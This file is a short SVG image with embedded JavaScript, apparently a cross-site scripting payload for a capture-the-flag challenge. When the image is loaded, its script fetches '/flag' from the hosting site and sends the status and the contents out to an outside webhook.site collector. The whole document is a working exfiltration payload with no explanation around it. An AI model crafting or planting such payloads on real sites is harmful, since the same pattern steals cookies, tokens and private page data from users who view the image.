<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://webhook.site/YOUR-ID?step=loaded');

    fetch('/flag')
      .then(r => {
        fetch('https://webhook.site/YOUR-ID?step=flag-status-' + r.status);
        return r.text();
      })
      .then(f => {
        fetch('https://webhook.site/YOUR-ID?flag=' + encodeURIComponent(f));
      });
  </script>
</svg>
